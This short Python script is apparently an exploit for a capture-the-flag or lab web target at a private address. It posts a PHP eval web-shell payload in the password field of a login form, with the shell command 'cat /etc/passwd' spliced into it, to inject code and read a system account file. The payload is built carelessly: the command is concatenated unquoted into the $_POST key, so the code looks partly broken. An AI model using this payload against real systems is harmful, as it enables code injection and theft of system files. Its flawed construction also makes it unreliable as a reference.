import re
import requests

url = "http://192.168.56.4:8015/music-copyright/cgi-bin/login.php"
email = 'a@gmail.php'
code = 'cat /etc/passwd'
payload = {'email': email, 'password': '<?php eval($_POST[' + code + ']); ?>'}
r = requests.post(url, data=payload)
print(r.text)
